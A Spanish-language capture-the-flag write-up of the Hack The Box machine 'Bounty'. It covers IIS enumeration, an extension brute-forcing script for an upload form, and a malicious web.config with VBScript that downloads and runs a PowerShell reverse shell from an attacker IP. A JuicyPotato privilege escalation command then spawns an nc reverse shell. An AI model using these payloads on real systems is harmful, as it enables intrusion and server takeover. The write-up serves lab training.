# Bounty-HTB

## NMAP

Esta maquina solo tiene el puerto 80 abierto.

![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/4d99534a-d8d7-4b37-8450-fee111059940)

## Dirbuster y WFUZZ

Para esta maquina ya nos dimos cuenta que nos enfrentamos a un ***IIS 7.5*** buscamos archivos .aspx, .asp, .config.

```
dirbuster -u http://10.129.1.185/ -t 200 -l /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -r dirout.ext -e php,txt,html,asp,aspx,config


```
Siempre que estes probando algo creo que es bueno ver hacktricks.

> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services

Se encontro una pagina trasfer.aspx

![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/39bea836-ef1f-41c3-a8c0-303c2e772704)


Siempre que tenemos este tipo de cosas hay que probar que extenciones permiten las que nos permitirian ejecutar comandos son .asp, aspx y .config ( esta yo no sabia). Otra ruta que se encontro es:

> http://10.129.18.176/UploadedFiles


## Python (probando extenciones que acepta)

Para probar extenciones se uso el script de s4vitar.

```python

#!/usr/bin/python3

from pwn import *
import signal, time, pdb, sys, requests, re

# Diccionario A Utilizar
# /usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt

transfer_url='http://10.129.137.104/transfer.aspx'

def def_handler(sig, frame):
	print("\n\n[!] Saliendo....\n")
	sys.exit(1)

#CTRL+ C
signal.signal(signal.SIGINT, def_handler)
#time.sleep(10)

burp = { 'http': 'http://127.0.0.1:8080'}

def uploadFile(extension):
	# Vamos a arrastrar sesiones
	#r = requests.get(transfer_url)
	s = requests.session()
	r = s.get(transfer_url)
	#pdb.set_trace()
	viewState = re.findall(r'id="__VIEWSTATE" value="(.*?)"',r.text)[0]
	#print(viewState)
	#pdb.set_trace()
	eventValidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"',r.text)[0]
	#print(eventValidation)
	post_data = {
	'__VIEWSTATE': viewState,
	'__EVENTVALIDATION': eventValidation,
	'btnUpload': 'Upload'
	}
	fileUploaded = {'FileUpload1': ('Prueba%s' % extension, 'Esto es una prueba')}
	r = s.post(transfer_url,data=post_data,files= fileUploaded) # proxies=burp
	#print(r.text)
	if "Invalid File. Please try again"  not in r.text:
		#print ("La Extencion es correcta")
		log.info("La extension %s valida " % extension)




if __name__ == '__main__':
	f = open("/usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt", "rb")

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando ataque de fuerza bruta")

	time.sleep(2)

	for extension in f.readlines():
		#pdb.set_trace()
		extension= extension.decode().strip()
		p1.status("Probando con la extension %s" % extension)
		uploadFile(extension)


```

![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/1c58bea9-bc86-456c-9c6e-eb1277585549)


## Burpsuite

Se pueden probar las extenciones validas con el intruder.

![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/0dae7f01-379a-43f8-973c-29fce098dab0)

Agregamos ahi en donde esta la extencion y nos vamos a payloads.

![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/c5088d8c-fe65-4b72-8480-69a6ffde08aa)


Al lanzarlo tenemos un problema lo esta URL encodeando necesitamos arreglar eso o no funciona.

![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/ba912ed8-fa64-4bba-ba6e-6bbd1dd4aa02)

Quitamos esa opcion. Si queremos que nos saque una frase cosa que veo ya inecesario solo fijate en el length

![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/c85ba7ee-5e0c-4567-9eb0-7a704f16e08e)


## RCE

Entonces en este punto ya sabemos que se puede subir una extencion .config por lo que vamos a subir un web.config con una reverseshell.

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')")
%>
```

![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/a07d1f8f-3ce1-43cd-b514-8f956b4581db)


Con esto ganamos acceso a la maquina y ya sabes haciendo una enumeracion vemos el privilegio de SetImpersonate. Algo a destacar la flag estaba escondida como archivo oculto. usa las opciones /a:h tanto como para buscar como para listar.

### JuicePotato

La manera mas facil de escalar privilegios.

```
.\JuicyPotato.exe -t * -l 1337 -p cmd.exe -a "/c C:\Windows\Temp\Privesc\nc64.exe -e cmd.exe 10.10.14.22 1234" -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"

```

![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/4d86d65b-f0b9-4819-a76a-4390e58a2420)


















































































